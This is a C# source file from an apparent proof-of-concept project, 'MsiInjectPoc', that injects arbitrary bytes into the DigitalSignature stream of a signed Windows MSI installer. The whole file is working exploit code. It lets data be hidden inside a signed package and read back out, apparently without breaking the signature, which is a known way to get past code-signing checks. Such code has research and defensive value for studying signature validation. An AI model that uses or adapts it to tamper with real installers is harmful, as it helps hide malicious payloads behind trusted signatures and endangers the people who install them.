using System;
using System.IO;
using System.IO.Packaging;

namespace MsiInjectPoc
{
	internal class MsiInjector : IDisposable
	{
		private const string DigitalSignatureName = "\x0005DigitalSignature";

		private readonly MicrosoftCfb cfb;

		public MsiInjector(string path)
		{
			this.cfb = new MicrosoftCfb(path);

			try
			{
				this.cfb.GetStreamInfo(DigitalSignatureName).GetStream();
			}
			catch
			{
				throw new ArgumentException("No digital signature in MSI");
			}
		}

		public void Dispose() => this.cfb.Dispose();

		public byte[] GetInjection() => this.GetInjectedData()?.Data;

		public void SetInjection(byte[] newInjection)
		{
			StreamInfo certStreamInfo = this.cfb.GetStreamInfo(DigitalSignatureName);

			InjectedData injection = new InjectedData(newInjection);
			InjectedData origInjection = this.GetInjectedData();

			byte[] newData = injection.Serialize();

			long delta = newData.LongLength - (origInjection?.Serialize().LongLength ?? 0);

			Stream certStream = certStreamInfo.GetStream();
			certStream.Seek(0, SeekOrigin.Begin);
			certStream.SetLength(certStream.Length + delta);
			certStream.Seek(-newData.Length, SeekOrigin.End);
			certStream.Write(newData, 0, newData.Length);
			certStream.Flush();
			certStream.Dispose();
		}

		private InjectedData GetInjectedData()
		{
			StreamInfo certStreamInfo = this.cfb.GetStreamInfo(DigitalSignatureName);
			Stream certStream = certStreamInfo.GetStream();

			certStream.Seek(0, SeekOrigin.Begin);
			byte[] certStreamData = new byte[certStream.Length];
			int readLength = certStream.Read(certStreamData, 0, certStreamData.Length);
			certStream.Dispose();

			return readLength == certStreamData.Length ? InjectedData.TryFrom(certStreamData) : null;
		}
	}
}